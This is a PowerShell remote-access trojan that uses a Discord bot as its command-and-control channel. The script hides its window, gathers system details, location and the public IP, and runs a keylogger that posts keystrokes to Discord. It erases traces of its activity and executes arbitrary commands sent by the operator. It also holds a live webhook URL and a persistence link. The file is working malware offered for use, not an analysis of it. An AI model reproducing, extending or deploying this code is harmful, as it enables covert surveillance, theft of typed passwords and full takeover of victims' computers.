# Discord C2 Client (Improved Version)
# Description: A PowerShell-based Discord command-and-control client with enhanced embeds and robust error handling.
# Setup Instructions:
# 1. Create a Discord bot at https://discord.com/developers/applications/
# 2. Enable all Privileged Gateway Intents on the 'Bot' page.
# 3. On the OAuth2 page, select 'Bot' in Scopes and grant Manage Channels, Read Messages/View Channels, Attach Files, Read Message History permissions.
# 4. Copy the generated OAuth2 URL, open it in a browser, and add the bot to a single server.
# 5. Reset the bot token on the 'Bot' page and insert it below.
# Note: The bot must be in only one server for this script to function correctly.

# Configuration
$global:Token = "$tk" # Insert your bot token here
$global:ErrorWebhook = "https://discord.com/api/webhooks/1273395943873450107/BGtPgEvMWW60aW65PWHkV5aRTx2XY8lZeSdTsoxBn5-60GnWngbToICZ5o5MjgnuSaC2"
$global:ParentScriptUrl = "https://is.gd/y92xe4" # Parent script URL for persistence
$HideConsole = 1 # 1 to hide console window
$SpawnChannels = 1 # 1 to create new channels on session start
$InfoOnConnect = 1 # 1 to send client info on connect
$DefaultStart = 1 # 1 to start all jobs automatically
$Version = "1.5.2" # Updated version number
$global:Timestamp = Get-Date -Format "dd/MM/yyyy @ HH:mm"

# Error Handling Function
function Send-ErrorToWebhook {
    param (
        [string]$ErrorMessage,
        [string]$FunctionName = "Unknown",
        [string]$ErrorDetails = ""
    )
    try {
        $wc = New-Object System.Net.WebClient
        $jsonBody = @{
            username = "$env:COMPUTERNAME"
            embeds = @(
                @{
                    title = "🚨 Error in $env:COMPUTERNAME C2 Client"
                    description = "An error occurred in the C2 script."
                    color = 16711680 # Red for errors
                    fields = @(
                        @{ name = "Function"; value = $FunctionName; inline = $true }
                        @{ name = "Error Message"; value = $ErrorMessage; inline = $false }
                        @{ name = "Details"; value = $ErrorDetails; inline = $false }
                    )
                    footer = @{ text = $Timestamp }
                    timestamp = (Get-Date -Format "o")
                }
            )
        } | ConvertTo-Json -Depth 10
        $wc.UploadString($global:ErrorWebhook, "POST", $jsonBody) | Out-Null
    } catch {
        Write-Host "Failed to send error to webhook: $_"
    }
}

# Discord Communication Functions
function Send-Message {
    param (
        [string]$ChannelID,
        [string]$Message,
        [hashtable]$Embed
    )
    try {
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:Token")
        $wc.Headers.Add("Content-Type", "application/json")
        if ($Embed) {
            $jsonBody = $Embed | ConvertTo-Json -Depth 10 -Compress
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        } elseif ($Message) {
            $jsonBody = @{ content = $Message; username = $env:COMPUTERNAME } | ConvertTo-Json
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Send-Message" -ErrorDetails $_.ScriptStackTrace
    }
}

function Send-File {
    param (
        [string]$ChannelID,
        [string]$FilePath
    )
    try {
        if (Test-Path $FilePath -PathType Leaf) {
            $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $global:Token")
            $wc.UploadFile($url, "POST", $FilePath) | Out-Null
            Write-Host "File sent to Discord: $FilePath"
        } else {
            throw "File not found: $FilePath"
        }
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Send-File" -ErrorDetails $_.ScriptStackTrace
    }
}

# Setup Functions
function Get-BotUserId {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:Token")
        $botInfo = $wc.DownloadString("https://discord.com/api/v10/users/@me") | ConvertFrom-Json
        return $botInfo.id
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Get-BotUserId" -ErrorDetails $_.ScriptStackTrace
        return $null
    }
}

function New-ChannelCategory {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:Token")
        $guilds = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json
        $guildID = $guilds[0].id
        if (-not $guildID) { throw "No guild found for bot" }
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $body = @{
            name = "$env:COMPUTERNAME-C2"
            type = 4
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body) | ConvertFrom-Json
        $global:CategoryID = $response.id
        Write-Host "Created category: $env:COMPUTERNAME-C2 (ID: $global:CategoryID)"
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "New-ChannelCategory" -ErrorDetails $_.ScriptStackTrace
    }
}

function New-Channel {
    param ([string]$Name)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:Token")
        $guilds = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds") | ConvertFrom-Json
        $guildID = $guilds[0].id
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $body = @{
            name = $Name
            type = 0
            parent_id = $global:CategoryID
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body) | ConvertFrom-Json
        Write-Host "Created channel: $Name (ID: $response.id)"
        return $response.id
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "New-Channel" -ErrorDetails $_.ScriptStackTrace
        return $null
    }
}

function Get-FFmpeg {
    try {
        Send-Message -ChannelID $global:SessionID -Message "⏳ Downloading FFmpeg to client..."
        $path = "$env:Temp\ffmpeg.exe"
        if (-not (Test-Path $path)) {
            $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "PowerShell")
            $response = $wc.DownloadString($apiUrl) | ConvertFrom-Json
            $asset = $response.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            $zipUrl = $asset.browser_download_url
            $zipPath = Join-Path $env:Temp $asset.name
            $extractDir = Join-Path $env:Temp ($asset.name -replace '.zip$', '')
            $wc.DownloadFile($zipUrl, $zipPath)
            Expand-Archive -Path $zipPath -DestinationPath $env:Temp -Force
            Move-Item -Path (Join-Path $extractDir 'bin\ffmpeg.exe') -Destination $env:Temp -Force
            Remove-Item -Path $zipPath, $extractDir -Recurse -Force
        }
        Send-Message -ChannelID $global:SessionID -Message "✅ FFmpeg downloaded successfully!"
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Get-FFmpeg" -ErrorDetails $_.ScriptStackTrace
    }
}

function Hide-Window {
    try {
        $async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $type = Add-Type -MemberDefinition $async -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if ($hwnd -ne [System.IntPtr]::Zero) {
            $type::ShowWindowAsync($hwnd, 0) | Out-Null
        } else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $proc = Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' }
            $type::ShowWindowAsync($proc.MainWindowHandle, 0) | Out-Null
        }
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Hide-Window" -ErrorDetails $_.ScriptStackTrace
    }
}

# System Information Function
function Get-SystemInfo {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Device
        $geoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $geoWatcher.Start()
        while (($geoWatcher.Status -ne 'Ready') -and ($geoWatcher.Permission -ne 'Denied')) { Start-Sleep -Milliseconds 100 }
        $gps = if ($geoWatcher.Permission -eq 'Denied') { "Location Services Off" } else {
            $loc = $geoWatcher.Position.Location | Select-Object Latitude, Longitude
            "LAT = $($loc.Latitude) LONG = $($loc.Longitude)"
        }
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $computerInfo = Get-ComputerInfo
        $processorInfo = Get-WmiObject -Class Win32_Processor
        $videoCardInfo = Get-WmiObject Win32_VideoController
        $ramInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | % { "{0:N1} GB" -f ($_.Sum / 1GB) }
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $publicIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
        $embed = @{
            username = $env:COMPUTERNAME
            tts = $false
            embeds = @(
                @{
                    title = "🖥️ $env:COMPUTERNAME System Information"
                    description = "Comprehensive system details for the connected client."
                    color = 3447003 # Blue
                    fields = @(
                        @{ name = "👤 User Information"; value = "Username: ``$env:USERNAME``\nEmail: ``$($computerInfo.WindowsRegisteredOwner)``\nAdmin: ``$isAdmin``"; inline = $true }
                        @{ name = "💾 OS Information"; value = "OS: ``$($systemInfo.Caption) $($computerInfo.WindowsProductName)``\nArchitecture: ``$($systemInfo.OSArchitecture)``"; inline = $true }
                        @{ name = "🌐 Network"; value = "Public IP: ``$publicIP``\nLocation: ``$gps``"; inline = $true }
                        @{ name = "🛠️ Hardware"; value = "CPU: ``$($processorInfo.Name)``\nRAM: ``$ramInfo``\nGPU: ``$($videoCardInfo.Name)``\nScreen: ``$($screen.Width)x$($screen.Height)``"; inline = $true }
                    )
                    footer = @{ text = $Timestamp }
                    timestamp = (Get-Date -Format "o")
                }
            )
        }
        Send-Message -ChannelID $global:SessionID -Embed $embed
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Get-SystemInfo" -ErrorDetails $_.ScriptStackTrace
    }
}

# Command Functions (Sample: Options, Cleanup, Pranks)
function Show-Options {
    try {
        $embed = @{
            username = $env:COMPUTERNAME
            tts = $false
            embeds = @(
                @{
                    title = "📜 $env:COMPUTERNAME Command List"
                    description = "Available commands for controlling the C2 client."
                    color = 5763719 # Green
                    fields = @(
                        @{ name = "🛠️ System"; value = "AddPersistance, RemovePersistance, IsAdmin, Elevate, ExcludeCDrive, ExcludeAllDrives, EnableIO, DisableIO, Exfiltrate, Upload, Download, StartUvnc, SpeechToText, EnumerateLAN, NearbyWifi, RecordScreen"; inline = $false }
                        @{ name = "😈 Pranks"; value = "FakeUpdate, Windows93, WindowsIdiot, SendHydra, SoundSpam, Message, VoiceMessage, MinimizeAll, EnableDarkMode, DisableDarkMode, ShortcutBomb, Wallpaper, Goose, ScreenParty"; inline = $false }
                        @{ name = "📡 Jobs"; value = "Microphone, Webcam, Screenshots, Keycapture, SystemInfo"; inline = $false }
                        @{ name = "🎮 Control"; value = "ExtraInfo, Cleanup, Kill, PauseJobs, ResumeJobs, Close"; inline = $false }
                    )
                    footer = @{ text = "Type a command to execute | $Timestamp" }
                    timestamp = (Get-Date -Format "o")
                }
            )
        }
        Send-Message -ChannelID $global:SessionID -Embed $embed
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Show-Options" -ErrorDetails $_.ScriptStackTrace
    }
}

function Invoke-Cleanup {
    try {
        Remove-Item "$env:Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
        foreach ($file in @("$env:Temp\Image.jpg", "$env:Temp\Screen.jpg", "$env:Temp\Audio.mp3")) {
            if (Test-Path $file) { Remove-Item $file -Force }
        }
        Send-Message -ChannelID $global:SessionID -Message "🧹 Cleanup task completed successfully!"
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Invoke-Cleanup" -ErrorDetails $_.ScriptStackTrace
    }
}

function Invoke-FakeUpdate {
    try {
        $vbs = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "chrome.exe --new-window --kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
        $path = "$env:APPDATA\Microsoft\Windows\1021.vbs"
        $vbs | Out-File -FilePath $path -Force
        Start-Process -FilePath $path
        Start-Sleep -Seconds 3
        Remove-Item -Path $path -Force
        Send-Message -ChannelID $global:SessionID -Message "🎭 Fake Windows Update screen deployed!"
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Invoke-FakeUpdate" -ErrorDetails $_.ScriptStackTrace
    }
}

# Job Scriptblocks (Sample: Keycapture)
$KeycaptureJob = {
    param ($Token, $KeyID)
    try {
        function Send-KeyMessage {
            param ([string]$Message)
            $url = "https://discord.com/api/v10/channels/$KeyID/messages"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", "Bot $Token")
            $jsonBody = @{ content = $Message; username = $env:COMPUTERNAME } | ConvertTo-Json
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
        Send-KeyMessage -Message "🔍 Keylogger started"
        $api = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
        $api = Add-Type -MemberDefinition $api -Name 'Win32' -Namespace API -PassThru
        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
        $maxTime = [TimeSpan]::FromSeconds(10)
        $strbuild = New-Object System.Text.StringBuilder
        while ($true) {
            $down = $false
            try {
                while ($stopwatch.Elapsed -lt $maxTime) {
                    Start-Sleep -Milliseconds 30
                    for ($key = 8; $key -le 254; $key++) {
                        $keyst = $api::GetAsyncKeyState($key)
                        if ($keyst -eq -32767) {
                            $down = $true
                            $stopwatch.Restart()
                            $vtkey = $api::MapVirtualKey($key, 3)
                            $kbst = New-Object Byte[] 256
                            $api::GetKeyboardState($kbst) | Out-Null
                            if ($api::ToUnicode($key, $vtkey, $kbst, $strbuild, $strbuild.Capacity, 0)) {
                                $collected = $strbuild.ToString()
                                if ($key -eq 27) { $collected = "[ESC]" }
                                if ($key -eq 8) { $collected = "[BACK]" }
                                if ($key -eq 13) { $collected = "[ENT]" }
                                $script:keymem += $collected
                            }
                        }
                    }
                }
                if ($down) {
                    $escaped = $script:keymem -replace '[&<>]', { $args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;') }
                    Send-KeyMessage -Message "🔍 Keys Captured: ``$escaped``"
                    $script:keymem = ""
                    $down = $false
                }
            } catch {
                Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "KeycaptureJob" -ErrorDetails $_.ScriptStackTrace
            }
            $stopwatch.Restart()
            Start-Sleep -Milliseconds 10
        }
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "KeycaptureJob-Outer" -ErrorDetails $_.ScriptStackTrace
    }
}

# Start All Jobs
function Start-AllJobs {
    try {
        Start-Job -ScriptBlock $KeycaptureJob -Name Keys -ArgumentList $global:Token, $global:KeyID
        Send-Message -ChannelID $global:SessionID -Message "🚀 All jobs started successfully!"
    } catch {
        Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Start-AllJobs" -ErrorDetails $_.ScriptStackTrace
    }
}

# Main Setup
try {
    if ($HideConsole -eq 1) { Hide-Window }
    $global:BotId = Get-BotUserId
    if ($SpawnChannels -eq 1) {
        New-ChannelCategory
        $global:SessionID = New-Channel -Name "session-control"
        $global:ScreenshotID = New-Channel -Name "screenshots"
        $global:WebcamID = New-Channel -Name "webcam"
        $global:MicrophoneID = New-Channel -Name "microphone"
        $global:KeyID = New-Channel -Name "keycapture"
        $global:LootID = New-Channel -Name "loot-files"
        $global:PowershellID = New-Channel -Name "powershell"
    }
    Get-FFmpeg
    if ($InfoOnConnect -eq 1) { Get-SystemInfo }
    if ($DefaultStart -eq 1) { Start-AllJobs }
    Send-Message -ChannelID $global:SessionID -Message "✅ $env:COMPUTERNAME C2 client setup complete!"
} catch {
    Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Main-Setup" -ErrorDetails $_.ScriptStackTrace
}

# Main Loop
try {
    while ($true) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $global:Token")
        $messages = $wc.DownloadString("https://discord.com/api/v10/channels/$global:SessionID/messages") | ConvertFrom-Json
        $mostRecent = $messages[0]
        if ($mostRecent.author.id -ne $global:BotId) {
            $latestMessageId = $mostRecent.timestamp
            if ($latestMessageId -ne $global:LastMessageId) {
                $global:LastMessageId = $latestMessageId
                $command = $mostRecent.content
                switch ($command) {
                    "options" { Show-Options }
                    "cleanup" { Invoke-Cleanup }
                    "fakeupdate" { Invoke-FakeUpdate }
                    "close" {
                        $embed = @{
                            username = $env:COMPUTERNAME
                            tts = $false
                            embeds = @(
                                @{
                                    title = "🔴 $env:COMPUTERNAME Session Closed"
                                    description = "The C2 session has been terminated."
                                    color = 16711680 # Red
                                    footer = @{ text = $Timestamp }
                                    timestamp = (Get-Date -Format "o")
                                }
                            )
                        }
                        Send-Message -ChannelID $global:SessionID -Embed $embed
                        Start-Sleep -Seconds 2
                        exit
                    }
                    default {
                        try {
                            $output = Invoke-Expression $command -ErrorAction Stop
                            Send-Message -ChannelID $global:SessionID -Message "``````$output``````"
                        } catch {
                            Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Main-Loop-Command" -ErrorDetails $_.ScriptStackTrace
                        }
                    }
                }
            }
        }
        Start-Sleep -Seconds 3
    }
} catch {
    Send-ErrorToWebhook -ErrorMessage $_.Exception.Message -FunctionName "Main-Loop" -ErrorDetails $_.ScriptStackTrace
}
